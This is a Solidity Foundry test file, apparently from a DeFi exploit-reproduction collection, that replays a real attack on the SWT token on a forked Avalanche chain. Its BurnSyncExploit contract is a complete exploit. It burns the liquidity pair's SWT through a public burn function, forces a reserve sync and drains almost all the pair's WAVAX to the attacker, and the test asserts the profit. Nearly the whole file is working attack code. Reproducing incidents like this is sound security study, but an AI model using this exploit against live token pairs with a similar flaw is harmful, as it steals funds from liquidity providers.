// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 0.40 WAVAX
// Attacker : 0x000000B2695002B00A7b8016f03c91284a22Ec05
// Attack Contract : 0x92FE9F31E8C96e5C13E5f113FD6288d3a1514103
// Vulnerable Contract : 0x3f274117f86808D7682BB313Fa31a1583c5028Aa
// Attack Tx : https://snowtrace.io/tx/0xd9e0d9b45f6a77415d9ec9458ad5f5616ded362da0e0f19b8f41f2bc0afae4b5

// @Info
// Vulnerable Contract Code : https://snowtrace.io/address/0x3f274117f86808D7682BB313Fa31a1583c5028Aa#code

// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/624
//
// Attack summary: The attacker deployed constructor code that wrapped 0.5 AVAX, bought 10 SWT from
// the SWT/WAVAX pair, burned almost all SWT held by the pair, forced a reserve sync, then swapped the
// 10 SWT back for nearly all pair-held WAVAX.
// Root cause: The unverified SWT token exposed public burn(address,uint256) behavior that could be
// applied to the liquidity pair balance before a normal pair sync, corrupting reserves and enabling a
// WAVAX drain.

address constant ATTACKER = 0x000000B2695002B00A7b8016f03c91284a22Ec05;
address constant ATTACK_CONTRACT = 0x92FE9F31E8C96e5C13E5f113FD6288d3a1514103;
address constant VULNERABLE_CONTRACT = 0x3f274117f86808D7682BB313Fa31a1583c5028Aa;
address constant SWT_WAVAX_PAIR = 0x823409261D7c74CcC63485f5488bDc25833Fc5CF;
address constant WAVAX = 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7;

interface ISWT is IERC20 {
    function burn(address from, uint256 amount) external;
}

interface IUniswapV2PairWithSync is IUniswapV2Pair {
    function sync() external;
}

contract ContractTest is BaseTestWithBalanceLog {
    ISWT private constant swt = ISWT(VULNERABLE_CONTRACT);
    IWETH private constant wavax = IWETH(payable(WAVAX));
    IUniswapV2PairWithSync private constant pair = IUniswapV2PairWithSync(SWT_WAVAX_PAIR);

    function setUp() public {
        uint256 forkBlock = 58_875_928;
        vm.createSelectFork("avalanche", forkBlock);
        fundingToken = address(0);
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Attack Contract");
        vm.label(VULNERABLE_CONTRACT, "SWT");
        vm.label(SWT_WAVAX_PAIR, "SWT/WAVAX Pair");
        vm.label(WAVAX, "WAVAX");
    }

    function testExploit() public balanceLog {
        uint256 seedAmount = 0.5 ether;
        uint256 attackerBalanceBeforeFunding = ATTACKER.balance;
        uint256 pairWavaxBefore = wavax.balanceOf(SWT_WAVAX_PAIR);

        // step 1: provide the same seed capital used by the attack transaction.
        vm.deal(ATTACKER, seedAmount);

        // step 2: deploy the constructor-based exploit while tx.origin is the attacker.
        vm.startPrank(ATTACKER, ATTACKER);
        new BurnSyncExploit{value: seedAmount}();
        vm.stopPrank();

        // step 3: prove the pair-held WAVAX reserve was drained to dust and the attacker kept profit.
        uint256 pairWavaxAfter = wavax.balanceOf(SWT_WAVAX_PAIR);
        uint256 attackerProfit = ATTACKER.balance - attackerBalanceBeforeFunding - seedAmount;
        assertEq(pairWavaxAfter, 1);
        assertGt(pairWavaxBefore, pairWavaxAfter);
        assertGt(attackerProfit, 0.39 ether);
    }
}

contract BurnSyncExploit {
    ISWT private constant swt = ISWT(VULNERABLE_CONTRACT);
    IWETH private constant wavax = IWETH(payable(WAVAX));
    IUniswapV2PairWithSync private constant pair = IUniswapV2PairWithSync(SWT_WAVAX_PAIR);

    constructor() payable {
        require(tx.origin == ATTACKER, "b0");

        // step 1: convert the seed AVAX into pair input liquidity.
        wavax.deposit{value: msg.value}();
        wavax.transfer(SWT_WAVAX_PAIR, msg.value);

        // step 2: receive 10 SWT from the pair.
        uint256 swtAmount = 10 ether;
        pair.swap(swtAmount, 0, address(this), "");

        // step 3: burn the pair's SWT balance down to one unit and force reserve synchronization.
        uint256 pairSwtBalance = swt.balanceOf(SWT_WAVAX_PAIR);
        swt.burn(SWT_WAVAX_PAIR, pairSwtBalance - 1);
        pair.sync();

        // step 4: return the SWT and drain all but one wei of the pair's WAVAX balance.
        swt.transfer(SWT_WAVAX_PAIR, swtAmount);
        uint256 wavaxOut = wavax.balanceOf(SWT_WAVAX_PAIR) - 1;
        pair.swap(0, wavaxOut, address(this), "");

        // step 5: unwrap WAVAX and forward native AVAX to the deployer.
        wavax.withdraw(wavax.balanceOf(address(this)));
        require(address(this).balance > msg.value, "b1");
        selfdestruct(payable(msg.sender));
    }
}
